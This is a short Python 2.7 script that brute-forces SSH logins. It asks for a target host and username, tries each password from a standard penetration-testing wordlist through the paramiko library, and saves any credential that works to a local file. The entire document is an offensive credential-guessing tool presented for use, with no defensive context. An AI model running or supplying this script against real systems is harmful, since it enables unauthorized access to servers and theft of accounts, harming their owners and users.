#!/usr/bin/python2.7

import paramiko
from subprocess import call
ssh = paramiko.SSHClient()                  
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

call("clear")

target = raw_input("Enter Target:\n>>> ")
c = call("clear")
usr = raw_input("Enter Username:\n>>> ")
call("clear")
call(['touch', 'passwd.lst'])

f = open('/usr/share/wordlists/fasttrack.txt')

for each_line in f:
    try:    
        print ('Trying %s ' % each_line)
        ssh.connect(target, username= usr, password= each_line.rstrip())
        ssh.close()
        w = open('passwd.lst','w')
        w.write('%s@%s  %s' % ( usr, target, each_line))
        print ':)'
    except paramiko.ssh_exception.AuthenticationException:
            print "Failed"
    except paramiko.ssh_exception.SSHException:
            print "Failed"
    finally:
        ssh.close()
        call("clear")
    
